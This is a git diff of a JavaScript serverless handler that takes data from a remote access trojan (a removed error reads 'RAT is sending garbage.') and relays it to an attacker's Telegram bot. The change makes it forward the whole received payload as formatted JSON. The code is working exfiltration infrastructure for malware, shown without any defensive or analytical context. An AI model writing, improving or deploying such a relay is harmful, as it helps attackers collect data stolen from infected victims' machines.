@@ -16,19 +16,12 @@ export default async function handler(request, response) {
         return response.status(401).json({ error: 'Unauthorized: Invalid Key' });
     }
 
-    const preFormattedMessage = Object.values(data)[0];
-
-    if (!preFormattedMessage || typeof preFormattedMessage !== 'string') {
-        return response.status(400).json({ error: 'RAT is sending garbage.' });
+    if (Object.keys(data).length === 0) {
+        return response.status(400).json({ error: 'No data received' });
     }
 
     try {
-        // ### THE FINAL CLEANING JOB ###
-        const finalMessage = preFormattedMessage
-            .replace(/\*\*/g, '')          // Pehla Jhaadu: ** saaf karta hai
-            .replace(/SENT/g, 'send')           // Dusra Jhaadu: SENT ko send banata hai
-            .replace(/RECEIVED/g, 'Received'); // Teesra Jhaadu: RECEIVED ko Received banata hai
-
+        const formattedMessage = "```json\n" + JSON.stringify(data, null, 2) + "\n```";
         const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
         
         await fetch(telegramApiUrl, {
@@ -36,13 +29,13 @@ export default async function handler(request, response) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: finalMessage,
+                text: formattedMessage,
+                parse_mode: 'MarkdownV2',
             }),
         });
         
         return response.status(200).json({ status: 'ok' });
     } catch (error) {
-        console.error(error);
-        return response.status(500).json({ error: 'Failed to forward message' });
+        return response.status(500).json({ error: 'Failed to forward data' });
     }
 }
